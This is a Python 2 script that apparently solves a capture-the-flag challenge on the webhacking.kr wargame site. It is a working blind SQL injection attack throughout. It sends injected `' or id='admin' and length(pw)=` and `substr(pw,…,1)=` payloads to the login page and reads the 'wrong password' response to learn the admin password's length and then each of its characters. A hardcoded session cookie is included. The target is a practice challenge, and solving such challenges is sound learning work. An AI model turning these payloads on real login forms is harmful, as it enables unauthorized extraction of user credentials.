import urllib2
import requests

flag = ""
length = 0
i = 1

session = dict(PHPSESSID = "10s8isc0ebja0ii1d2bv7i07ij")
url = "https://webhacking.kr/challenge/bonus-1/index.php?"
while True:
    query = url+"id=admin&pw=' or id='admin' and length(pw)=" + str(i) + "%23"
    print 'TEST #',i
    print query
    r = requests.get(query, cookies=session)
    if 'wrong password' in r.text:
        length = i
        break

    i = i + 1

print 'PASSWORD LENGTH : ', length

for j in range(1, length+1):
    for i in range(33,97):

        query = url + "id=admin&pw=' or id='admin' and substr(pw,"+str(j)+",1)="+"'"+chr(i)+"'"+"%23"
        print 'TEST #',j,'-',i
        print query
        r = requests.get(query, cookies=session)

        if 'wrong password' in r.text:
            flag += chr(i)
            print "FLAG : ",flag
            break
